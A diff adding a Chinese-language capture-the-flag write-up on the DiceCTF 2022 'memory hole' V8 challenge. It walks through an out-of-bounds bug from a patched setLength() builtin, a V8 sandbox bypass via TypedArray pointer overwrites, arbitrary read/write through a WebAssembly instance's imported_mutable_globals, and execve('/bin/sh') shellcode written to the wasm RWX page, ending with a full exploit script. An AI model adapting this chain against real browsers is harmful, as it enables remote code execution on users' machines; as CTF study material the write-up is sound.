@@ -357,7 +357,373 @@ r.interactive()
 
 ### memory hole
 
-TODO
+v8 challenge，patch 做了以下變動：
+
+- 開起 v8 sandbox
+
+  - `v8_enable_sandbox`, `v8_enable_sandboxed_external_pointers`, `v8_enable_sandboxed_pointers`, `v8_enable_sandbox_future`
+
+- 新增 array 的 built-in function `setLength()`
+
+  ```diff
+  --- /dev/null
+  +++ b/src/builtins/array-setlength.tq
+  @@ -0,0 +1,14 @@
+  +namespace array {
+  +transitioning javascript builtin
+  +ArrayPrototypeSetLength(
+  +  js-implicit context: NativeContext, receiver: JSAny)(length: JSAny): JSAny {
+  +    try {
+  +      const len: Smi = Cast<Smi>(length) otherwise Pepega;
+  +      const array: JSArray = Cast<JSArray>(receiver) otherwise Pepega;
+  +      array.length = len;
+  +    } label Pepega {
+  +        Print("pepega");
+  +    }
+  +    return receiver;
+  +}
+  +}  // namespace array
+  ```
+
+- 避免一些 misc solution 做的 patch
+
+  - 註解掉 `Shell::AddOSMethods` 內的一些 function，像是 `system` 以及 `rmdir`
+  - 註解掉 `Shell::CreateGlobalTemplate` 內的一些 object template，如 `read` 以及 `print`
+  - 註解掉 `Shell::CreateD8Template(Isolate* isolate)` 內的一些 `d8_template` data
+
+使用 `%DebugPrint()` 稍微測試一下 `array.setLength()`，很快就能發現他可以讓使用者任意更改 `length` 欄位，而在長度超過原本的陣列大小時，存取 element 就會存取到後方的資料，因此有很明顯的 **OOB** 可以使用。
+
+再透過 `%DebugPrint()` 來 debug 時，你可能會注意到 `JSArray` 以及 `TypeArray` 都會紀錄大小，實際在 v8 當中會先由 `JSArray` object 紀錄 array 的基本資訊，而在根據不同種類的 `TypeArray`，會再有各自的 object 來描述對應 `TypeArray` 所需要的資訊。其中 array 的長度同時會由 `JSArray` 以及 `TypeArray` 儲存：
+
+- `JSArray` 的 length 會紀錄在 offset 0x4 ~ 0x7，存的是目前使用的大小
+- `TypeArray` 的 length 會紀錄在 offset 0x4 ~ 0x7，存的是總共的大小，可能會先分配比預期使用大小更多的空間
+- 在 `JSArray` 使用的大小即將大於 `TypeArray` 擁有的空間，`TypeArray` 會再擴充更多的額外空間以應付當前與之後的情況
+- 在做 **read / write** 的時候，看的是 `JSArray` 的大小，所以此題 `setLength()` 更新 `JSArray` 的 length，讓我們有任意讀 / 寫
+- P.S. Array 所紀錄的大小都是 4 bytes 為一個單位，因此 1 個 double value (8 bytes) 會佔 2 個單位
+
+下方為簡單的 `setLength()` PoC：
+
+```js
+var arr = [1.1, 2.2, 3.3];
+arr.setLength(100);
+```
+
+
+
+然而，雖然有 **OOB**，由於 [V8 pointer compression](https://v8.dev/blog/pointer-compression) 的關係，大多數的資料都只存 32-bit 的 offset 而已，因此我們能存取的範圍被受限在 V8 的 heap，沒辦法做到 aar / aaw，因此我們要能找到一種 object，其 member 內存放著 raw pointer (64-bit)，並且能讓我們任意讀寫，這樣就可以透過竄改此 pointer 的值來做 aar / aaw。
+
+- 一個 **isolate** instance 為一個獨立的執行環境，並且會有自己的一個 heap
+
+過去，`TypeBuffer` 有一個成員叫做 `backingstore`，在我們用 index 存取 element 時會從他指向的位址來做操作，並且由於他指向的空間有可能是 **PartitionAlloc** 所分配的空間，因此必須存放的 raw pointer，過去能簡單的透過竄改他做 exploit。
+
+- 因為 buffer 可能會需要很大的空間，有可能分配在不同的 heap region，因此才需要用 raw pointer，否則無法存取到其他 heap region
+
+再後來，`backingstore` 被拆成 `base_pointer` 以及 `external_pointer` 兩個部分，`base_pointer` 指向的是當前 isolate 的 heap base address (higher 32 bits)，`external_pointer` 則是存放 offset (lower 32 bits)，一樣還是可以從 `base_pointer` 來 leak heap base，並且竄改兩個 pointer member 來構造 aar / aaw。
+
+- `data_ptr = base_pointer + external_pointer`
+
+近期 (2021/10) @saelo 提出 [V8 Virtual Memory Cage](https://docs.google.com/document/d/17IW7LKiHrG3ZrtbS-EI8dJHD8-b6vpqCXnP3g315K2w/edit#heading=h.xzptrog8pyxf)，將原本存放 heap base 的 `base_pointer` 設為 nil，把他放到 register 當中 (`r14`)，以至於無法再直接透過 OOB 讀 `base_pointer` 來 leak heap base 了，並且 `base_pointer` 以及 `external_pointer` 的 value 也被限縮在 32-bit，因此侷限了 `TypedArray` 的攻擊範圍，竄改 pointer 的方式只能讓我們得到此 heap 的 aar / aaw 而已。
+
+- `data_ptr = js_base + (external_pointer << 8) + base_pointer`
+
+
+
+不過這個繞法很簡單，如果我們將 `TypedArray` 的 `external_pointer` 蓋成 0，這樣 `TypedArray` 就可以存取到 `js_base` 所存放的資料，而在那邊會有 `js_base` 的值，就能得到 heap base。而在蓋寫過程中，我們順便把 `TypedArray` 的成員 `byteslength` 以及 `length ` 蓋成很大的值，這樣就能在 heap 內有 aar / aaw：
+
+```js
+var tmp = ftoi(arr[19]); // get external_pointer and other 4 bytes data
+arr[19] = itof( tmp & 0xffffffff00000000n ); // overwrite external_pointer to nil
+tmp = ftoi(arr[16]); // get bytes length and other 4 bytes data
+arr[16] = itof( (tmp & 0xffffffff00000000n) + 0xfffffff0n ); // overwrite bytes length
+tmp = ftoi(arr[17]); // get length and other 4 bytes data
+arr[17] = itof( (tmp & 0xffffffffn) + 0x1ffffffe0000000000n ); // overwritelength to 0x1ffffffe
+
+var js_base = victim[3] - 0x4000n;
+info('js_base', js_base);
+```
+
+- `length` 一定要改，不過 `byteslength` 我不確定
+
+
+
+當我們有了基本的 primitive 後，再來的目標是要找有使用到 raw pointer 的 object，這也是這題的難處。參考 @kylebot，他發現 wasm 的 object `WasmInstance` 在 offset 0x50 的地方有個 member 為 `imported_mutable_globals`，存放的是 raw heap pointer，而在 0x60 offset 存放 wasm rwx page 的 base address，這讓我們可以：
+
+- raw heap pointer - 如果此 pointer 可以控制到 wasm 進行讀寫的地方，這樣就能夠透過竄改他做利用
+- rwx page address - 如果我們有 aaw，就可以寫 shellcode 到 rwx page address，並透過呼叫對應的 wasm function 執行這些 shellcode
+
+首先我們先了解 `imported_mutable_globals` 的用途。在 wasm 當中可以定義 global variable，並對其做相關的操作，下方為 global 變數的 setter / getter 寫法：
+
+```wasm
+(module
+	(global $g (import "js" "global") (mut i64))
+	
+   	(func (export "getGlobal") (result i64)
+        (global.get $g)
+    )
+    
+   	(func (export "setGlobal") (param $val i64)
+        (global.set $g (local.get $val))
+    )
+)
+```
+
+- 此模式為 wat，需要透過 `wat2wasm` 轉為 wasm 才能放到 js array 並餵入 `WebAssembly.Module()`
+
+
+
+可以把 `imported_mutable_globals` 視為 `uint64 (*imported_mutable_globals)[]` (a pointer point to array)，在操作 global 變數時，會先 deference `imported_mutable_globals` 取得 array 位址，而後從某個地方取得要存取的 global 變數 index，在對應 index 的地方還會有一個 pointer 指向變數真正的位址。舉例來說，在上面的範例程式碼中只有一個 global `global`，如果對他做操作，實際上就是 dereference `imported_mutable_globals` 兩次 (index 為 0)。
+
+
+
+不過我要怎麼知道 wasm instance 的位址在哪？ 我採取的方式為透過 `TypedArray` 搜尋只有 wasm 才有的 data pattern，因為在每次都是新執行環境的情況下，像 Map 以及相關資料的 32-bit offset 都會是固定的，並且不受 aslr 所影響，因此直接 brute force 搜尋 wasm 對應的 pattern，符合的就是我們 wasm instance 所在的位址。要注意的是，我並沒有很了解 V8 heap，但是不同 heap subregion 中間會用 guard page 保護 (透過 `vmmap` 得知)，並且一些 data 的起始位址會被侷限在某個 heap subregion，所以要搜的範圍其實沒有很多：
+
+```js
+for (let i = 0x081c0000/8; i < 0x08380000/8 - 3; i++) {
+    // aligned wasm
+    if (victim[i] == 0x0800224908206439n && victim[i+1] == 0x0800224908002249n) {
+        wasm_idx = BigInt(i);
+        wasm_addr = wasm_idx*8n + js_base
+        info("wasm_idx", wasm_idx);
+        info("wasm_addr", wasm_addr);
+        aligned = true;
+    }
+    // not aligned wasm
+    if (victim[i] >> 32n == 0x08206439n &&
+        victim[i+1] == 0x0800224908002249n && victim[i+2] && 0x0800224908002249n) {
+        wasm_idx = BigInt(i);
+        wasm_addr = wasm_idx*8n + js_base
+        info("wasm_idx", wasm_idx);
+        info("wasm_addr", wasm_addr);
+    }
+}
+```
+
+- 因為 object 並不一定對齊 0x8，加上我的 `TypedArray` 用的是 `BigUint64Array`，所以我要額外去 handle 沒有對齊的情況
+- 有發現 V8 heap 隨機的位址似乎是以數秒為一個單位做隨機，短時間內重複執行的話 heap 位址都會是相同的
+
+
+
+有了 wasm 的位址後就能構造 aar / aaw primitive。實作方式的部分總結來說，如果我們要做到 `aar(addr)`，只需要將 `imported_mutable_globals` 寫入 `js_base`，並在 `js_base+0` 寫入 `addr`，這樣 `*imported_mutable_globals == js_base`、`*js_base == addr`，就能對我們的 target address 做讀取了，而 `aaw(addr, value)` 也使用相同的方法：
+
+```js
+function aar(addr) {
+    let ret = null;
+    let victim_bk = victim[0];
+    victim[0] = addr;
+    victim[0] = 0n;
+    if (aligned) {
+        let bk = victim[ wasm_idx + 10n ];
+        victim[ wasm_idx + 10n ] = js_base; // set imported_mutable_globals ptr
+        ret = getGlobal();
+        victim[ wasm_idx + 10n ] = bk;
+    } else {
+        let bk1 = victim[ wasm_idx + 10n ];
+        let bk2 = victim[ wasm_idx + 11n ];
+        victim[ wasm_idx + 10n ] = (victim[ wasm_idx + 10n ] & 0xffffffffn) + ((js_base & 0xffffffffn) << 32n);
+        victim[ wasm_idx + 11n ] = ((victim[ wasm_idx + 11n ] >> 32n) << 32n) + (js_base >> 32n);
+        ret = getGlobal();
+        victim[ wasm_idx + 10n ] = bk1;
+        victim[ wasm_idx + 11n ] = bk2;
+    }
+    victim[0] = victim_bk;
+    return ret;
+}
+```
+
+- 10 為 `imported_mutable_globals` 的 offset (0x40)
+
+
+
+有了 aar / aaw，再來就是寫 shellcode，除了最基本的 `sys_execve("/bin/sh", 0, 0)`，因為 wasm function 的 entry point address 受到隨機化影響，因此我多 spray 了 `nop` 以及 `jmp .-0x60` 的 instruction 在 `sys_execve` shellcode 前後，這樣可以確保 exploit 不受太多隨機化影響：
+
+```js
+/*
+mov rax, 0x3b
+xor rsi, rsi
+xor rdx, rdx
+mov rdi, 0x68732f6e69622f
+mov qword ptr [rsp], rdi
+mov rdi, rsp
+syscall
+
+b'H\xc7\xc0;\x00\x00\x00H1\xf6H1\xd2H\xbf/bin/sh\x00H\x89<$H\x89\xe7\x0f\x05'
+*/
+
+nop = Array(0x8).fill(0x9090909090909090n); // 0x40
+shellcode = [0x480000003bc0c748n, 0x2fbf48d23148f631n, 0x480068732f6e6962n, 0x050fe78948243c89n]; // 0x20
+jmp = Array(0xc).fill(0x9eeb9eeb9eeb9eebn); // 0x60
+payload = nop + shellcode + jmp; // 0xc0
+```
+
+
+
+final exploit：
+
+```js
+// Utility function
+// ref from: https://github.com/Kyle-Kyle/blog/blob/master/writeups/dice22_memory_hole/pwn.js
+let hex = (val) => '0x' + val.toString(16);
+let info = (name, value) => console.log("[*] " + name + ": " + hex(value));
+function gc() {
+    for (let i = 0; i < 0x10; i++) new ArrayBuffer(0x1000000);
+}
+
+// used for stable fake JSValue crafting
+function js_heap_defragment() { // used for stable fake JSValue crafting
+    gc();
+    for (let i = 0; i < 0x1000; i++) new ArrayBuffer(0x10);
+}
+
+// for data type translation
+_buf = new ArrayBuffer(0x8);
+u64 = new BigUint64Array(_buf);
+f64 = new Float64Array(_buf);
+u32 = new Uint32Array(_buf);
+
+function ftoi(val) {
+    f64[0] = val;
+    return u64[0];
+}
+
+function itof(val) {
+    u64[0] = val;
+    return f64[0];
+}
+/////////////////////////////////////////
+
+js_heap_defragment();
+
+var arr = [1.1, 2.2, 3.3]; // use DoubleArray so we can read ptr as float
+var victim = new BigUint64Array(0x100);
+arr.setLength(100);
+
+// data_ptr = js_base + (external_pointer << 8) + base_pointer
+// js_base: saved in the register
+// base_pointer: null for TypedArray
+// external_pointer: different
+//
+// we overwrite the external_pointer of victim, make victim read / write data from js_base,
+// and the data around js_base has code_base and js_base, we can leak from there
+
+var tmp = ftoi(arr[19]); // get external_pointer and other 4 bytes data
+arr[19] = itof( tmp & 0xffffffff00000000n ); // overwrite external_pointer to nil
+tmp = ftoi(arr[16]); // get bytes length and other 4 bytes data
+arr[16] = itof( (tmp & 0xffffffff00000000n) + 0xfffffff0n ); // overwrite bytes length
+tmp = ftoi(arr[17]); // get length and other 4 bytes data
+arr[17] = itof( (tmp & 0xffffffffn) + 0x1ffffffe0000000000n ); // overwritelength to 0x1ffffffe
+
+var heap = victim[2];
+info('heap', heap);
+var js_base = victim[3] - 0x4000n;
+info('js_base', js_base);
+
+// wasm which is used to setup aar / aaw and execute our shellcode
+var global = new WebAssembly.Global({value:'i64', mutable:true}, 0n);
+var wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 9, 2, 96, 0, 1, 126, 96, 1, 126, 0, 2, 14, 1, 2, 106, 115, 6, 103, 108, 111, 98, 97, 108, 3, 126, 1, 3, 3, 2, 0, 1, 7, 25, 2, 9, 103, 101, 116, 71, 108, 111, 98, 97, 108, 0, 0, 9, 115, 101, 116, 71, 108, 111, 98, 97, 108, 0, 1, 10, 13, 2, 4, 0, 35, 0, 11, 6, 0, 32, 0, 36, 0, 11]);
+var wasm_module = new WebAssembly.Module(wasm_code);
+var wasm_instance = new WebAssembly.Instance(wasm_module, {js: {global}});
+var getGlobal = wasm_instance.exports.getGlobal;
+var setGlobal = wasm_instance.exports.setGlobal;
+
+var aligned = false;
+var wasm_idx = null;
+var wasm_addr = null;
+var victim_idx = null;
+var victim_addr = null;
+var rwx = null;
+
+// it should be in the second memory region, and data may not be aligned with 0x8
+for (let i = 0x081c0000/8; i < 0x08380000/8 - 2; i++) {
+    // aligned wasm
+    if (victim[i] == 0x0800224908206439n && victim[i+1] == 0x0800224908002249n) {
+        wasm_idx = BigInt(i);
+        wasm_addr = wasm_idx*8n + js_base
+        info("wasm_idx", wasm_idx);
+        info("wasm_addr", wasm_addr);
+        aligned = true;
+    }
+    // not aligned wasm
+    if (victim[i] >> 32n == 0x08206439n &&
+        victim[i+1] == 0x0800224908002249n && victim[i+2] && 0x0800224908002249n) {
+        wasm_idx = BigInt(i);
+        wasm_addr = wasm_idx*8n + js_base
+        info("wasm_idx", wasm_idx);
+        info("wasm_addr", wasm_addr);
+    }
+}
+
+if (aligned)
+    rwx = victim[ wasm_idx + 12n ];
+else
+    rwx = (victim[ wasm_idx + 12n ] >> 32n) + ((victim[ wasm_idx + 13n] & 0xffffffffn) << 32n);
+info("rwx", rwx);
+
+function aar(addr) {
+    let ret = null;
+    let victim_bk = victim[0];
+    victim[0] = addr;
+    victim[0] = 0n;
+    if (aligned) {
+        let bk = victim[ wasm_idx + 10n ];
+        victim[ wasm_idx + 10n ] = js_base; // set imported_mutable_globals ptr
+        ret = getGlobal();
+        victim[ wasm_idx + 10n ] = bk;
+    } else {
+        let bk1 = victim[ wasm_idx + 10n ];
+        let bk2 = victim[ wasm_idx + 11n ];
+        victim[ wasm_idx + 10n ] = (victim[ wasm_idx + 10n ] & 0xffffffffn) + ((js_base & 0xffffffffn) << 32n);
+        victim[ wasm_idx + 11n ] = ((victim[ wasm_idx + 11n ] >> 32n) << 32n) + (js_base >> 32n);
+        ret = getGlobal();
+        victim[ wasm_idx + 10n ] = bk1;
+        victim[ wasm_idx + 11n ] = bk2;
+    }
+    victim[0] = victim_bk;
+    return ret;
+}
+
+function aaw(addr, value) {
+    let victim_bk = victim[0];
+    victim[0] = addr;
+    if (aligned) {
+        let bk = victim[ wasm_idx + 10n ];
+        victim[ wasm_idx + 10n ] = js_base; // set imported_mutable_globals ptr
+        setGlobal(value);
+        victim[ wasm_idx + 10n ] = bk;
+    } else {
+        let bk1 = victim[ wasm_idx + 10n ];
+        let bk2 = victim[ wasm_idx + 11n ];
+        victim[ wasm_idx + 10n ] = (victim[ wasm_idx + 10n ] & 0xffffffffn) + ((js_base & 0xffffffffn) << 32n);
+        victim[ wasm_idx + 11n ] = ((victim[ wasm_idx + 11n ] >> 32n) << 32n) + (js_base >> 32n);
+        setGlobal(value);
+        victim[ wasm_idx + 10n ] = bk1;
+        victim[ wasm_idx + 11n ] = bk2;
+    }
+    victim[0] = victim_bk;
+}
+
+nop = Array(0x8).fill(0x9090909090909090n); // 0x40
+shellcode = [0x480000003bc0c748n, 0x2fbf48d23148f631n, 0x480068732f6e6962n, 0x050fe78948243c89n]; // 0x20
+jmp = Array(0xc).fill(0x9eeb9eeb9eeb9eebn); // 0x60
+payload = nop.concat(shellcode, jmp);
+
+for (let i = 168n, j = 0; i < 192n; i++, j++)
+    aaw(rwx + i*8n, payload[j]);
+aar(0n);
+```
+
+
+
+
+
+
+
+參考資料：
+
+- [[DiceCTF 2022] - memory hole](https://blog.kylebot.net/2022/02/06/DiceCTF-2022-memory-hole)
+
+
+
+
 
 ### nightmare
 
